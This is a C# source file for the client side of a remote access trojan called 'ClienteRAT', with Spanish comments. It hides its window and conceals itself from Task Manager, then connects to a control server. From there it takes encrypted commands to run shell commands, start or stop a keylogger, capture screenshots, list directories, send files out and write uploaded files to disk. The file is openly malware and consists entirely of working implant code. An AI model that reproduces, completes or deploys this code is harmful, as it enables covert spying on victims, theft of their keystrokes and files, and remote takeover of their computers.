using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Client.Commands;
using Client.Conexion;
using Client.Crypto;
using Client.Native;
using Client.Util;
using Microsoft.Extensions.Logging;

namespace Client
{
    class ClienteRAT
    {
        private static  byte[] aesKeyClient;


        public static byte[] getAesKey() { return aesKeyClient; }
        static async Task Main(string[] args)
        {
            try
            {
                // Ocultar la consola al inicio
                IntPtr hwnd = Process.GetCurrentProcess().MainWindowHandle;
                if (hwnd != IntPtr.Zero)
                {
                    NativeMethods.ShowWindow(hwnd, NativeMethods.SW_HIDE);
                }

                // Ocultar el proceso del Administrador de Tareas y generar persistencia
                Functions.HideFromTaskManager();
                // Functions.AddPersistence();

                // Iniciar la conexión con el servidor
                ClientSocket.connect();
                Thread.Sleep(1000);


                var stream = ClientSocket.getClientStream();   
                byte[] buffer = new byte[1024];

                // Bucle principal para recibir comandos y enviar respuestas
                while (ClientSocket.isConnected())
                {

                    try
                    {
                        // 1) Leer el primer byte: canal
                        int b = stream.ReadByte();
                        if (b < 0) break;
                        var ch = (Channel)b;

                        if (Enum.IsDefined(typeof(Channel), ch))
                        {
                            // 2) Leer longitud (4 bytes)
                            ReadExact(stream, buffer, 0, 4);
                            int len = BitConverter.ToInt32(buffer, 0);
                            if (len < 0 || len > buffer.Length)
                                throw new Exception($"Longitud inválida: {len}");

                            // 3) Leer payload
                            ReadExact(stream, buffer, 0, len);
                            var payload = new byte[len];
                            Array.Copy(buffer, 0, payload, 0, len);

                            if (ch != Channel.KeyExchange && aesKeyClient != null)
                            {
                                payload = AesHelper.DecryptWithAes(payload, aesKeyClient);
                            }

                            // 4) Despachar por canal
                            switch (ch)
                            {
                                case Channel.CommandOutput:
                                    //Uso ClientSocket.Send ya que trabaja con string
                                    string cmd = Encoding.UTF8.GetString(payload);
                                    ClientSocket.SendResponse(HandleCommands.ExecuteCommand(cmd.Substring(5)),Channel.CommandOutput);
                                    break;
                                case Channel.Keylogger:

                                    if(Encoding.UTF8.GetString(payload) == "keylogger")
                                    {
                                        Keylogger.Start();
                                        
                                    }
                                    else if(Encoding.UTF8.GetString(payload) == "keylogger stop")
                                    {
                                        Keylogger.Stop();
                                        
                                    }
                                    break;
                                case Channel.Screenshot:
                                    if (Encoding.UTF8.GetString(payload) == "screenshot")
                                    {
                                        //Uso Protocol.Send ya que trabaja con bytes
                                        byte[] clientScreenshot = Screenshot.CaptureScreen();
                                        byte[] encryptedScreenshot = AesHelper.EncryptWithAes(clientScreenshot, aesKeyClient);
                                        Protocol.Send(stream, Channel.Screenshot, encryptedScreenshot);
                                    }
                                    break ;
                                case Channel.Main:
                                    string command = Encoding.UTF8.GetString(payload);
                                    if (command.StartsWith("disconnect"))
                                    {
                                        ClientSocket.disconnect();
                                        return;
                                    }
                                    break;
                                case Channel.FileManager:

                                    string ruta = Encoding.UTF8.GetString(payload);
                                    if (!Directory.Exists(ruta))
                                        return;

                                    StringBuilder sb = new StringBuilder();
                                    sb.AppendLine(ruta); // línea 0: ruta padre

                                    try
                                    {
                                        foreach (var dir in Directory.GetDirectories(ruta))
                                            sb.AppendLine("[DIR]" + dir);

                                        foreach (var file in Directory.GetFiles(ruta))
                                            sb.AppendLine("[FILE]" + file);
                                    }
                                    catch (Exception ex)
                                    {
                                        sb.AppendLine("[ERROR] " + ex.Message);
                                    }

                                    ClientSocket.SendResponse(sb.ToString(), Channel.FileManager);

                                    break;

                                case Channel.File:

                                    string filePath = Encoding.UTF8.GetString(payload);
                                    FileManager.sendFile(filePath);

                                    break;
                                    
                                case Channel.ServerFileUpload:

                                    try
                                    {
                                        int rutaLen = BitConverter.ToInt32(payload, 0);

                                        if (rutaLen < 0 || rutaLen > payload.Length - 4)
                                            throw new Exception("Longitud de ruta inválida.");

                                        string rutaArchivo = Encoding.UTF8.GetString(payload, 4, rutaLen);
                                        byte[] fileData = new byte[payload.Length - 4 - rutaLen];
                                        Array.Copy(payload, 4 + rutaLen, fileData, 0, fileData.Length);

                                        string carpeta = Path.GetDirectoryName(rutaArchivo);
                                        if (!Directory.Exists(carpeta))
                                            Directory.CreateDirectory(carpeta);

                                        File.WriteAllBytes(rutaArchivo, fileData);
                                    }
                                    catch (Exception ex)
                                    {
                                        File.WriteAllText("error_log.txt", ex.ToString()); // Log local para depurar
                                    }
                                    break;

                                case Channel.KeyExchange:

                                    string publicKeyXml = Encoding.UTF8.GetString(payload);
                                    RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
                                    rsa.FromXmlString(publicKeyXml);

                                    // Generar clave AES aleatoria
                                    Aes aes = Aes.Create();
                                    aes.GenerateKey();
                                    byte[] aesKey = aes.Key;

                                    aesKeyClient = aesKey;
                                    // Cifrar la clave AES con la clave pública RSA
                                    byte[] encryptedAesKey = rsa.Encrypt(aesKeyClient, false);
                                    Protocol.Send(stream, Channel.KeyExchange, encryptedAesKey);

                                    ClientSocket.SendResponse(await SystemInfo.GetSystemInfo(), Channel.SystemInfo);

                                    break;



                            }
                        }
                        else
                        {
                            // No es un canal válido, abandonar
                            break;
                        }
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error procesando paquete: {ex.Message}");
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error en conexión ClienteRAT: {ex.Message}");
            }
            finally
            {
                ClientSocket.disconnect();
            }
        }
        

        private static void ReadExact(NetworkStream stream, byte[] buffer, int offset, int count)
        {
            int read, total = 0;
            while (total < count)
            {
                read = stream.Read(buffer, offset + total, count - total);
                if (read == 0) throw new IOException("Conexión cerrada");
                total += read;
            }
        }


    }
}
